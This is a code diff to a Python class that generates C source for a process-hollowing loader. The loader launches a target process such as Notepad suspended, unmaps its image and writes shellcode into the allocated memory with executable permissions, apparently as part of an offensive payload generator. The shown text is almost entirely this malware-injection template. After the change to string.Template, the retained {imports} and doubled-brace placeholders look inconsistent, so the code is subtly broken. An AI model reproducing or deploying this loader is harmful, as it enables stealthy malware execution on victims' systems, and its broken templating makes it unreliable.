@@ -1,3 +1,5 @@
+from string import Template
+
 class processhollow:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
@@ -19,8 +21,8 @@ class processhollow:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 {imports}
 
 typedef NTSTATUS(WINAPI* _NtUnmapViewOfSectionFunc)(HANDLE ProcessHandle, PVOID BaseAddress);
@@ -47,7 +49,7 @@ int main(void) {{
     PROCESS_INFORMATION pi; 
 
     printf("[+] Creating Notepad.exe as Suspended Process.\\n");
-	CreateProcessA(NULL, (LPSTR) "{self.target}", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	CreateProcessA(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     
 	// Get All The Register Values
@@ -86,7 +88,7 @@ int main(void) {{
 	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)shellcode + dosHeader->e_lfanew);
 
 	// Allocating Memory in Suspended Process
-	PVOID allocatedMemory = VirtualAllocEx(pi.hProcess, baseAddress, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, {self.memoryPermission});
+	PVOID allocatedMemory = VirtualAllocEx(pi.hProcess, baseAddress, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
 
 	// Calculate The Offset Of the 64-bits Process Base Address From The File's Base Address
 	DWORD64 baseOffset = (DWORD64)baseAddress - ntHeaders->OptionalHeader.ImageBase;
@@ -205,4 +207,4 @@ int main(void) {{
 	return 0;
 
 }}
-"""
+""").substitute(target=self.target, memoryPermission=self.memoryPermission)
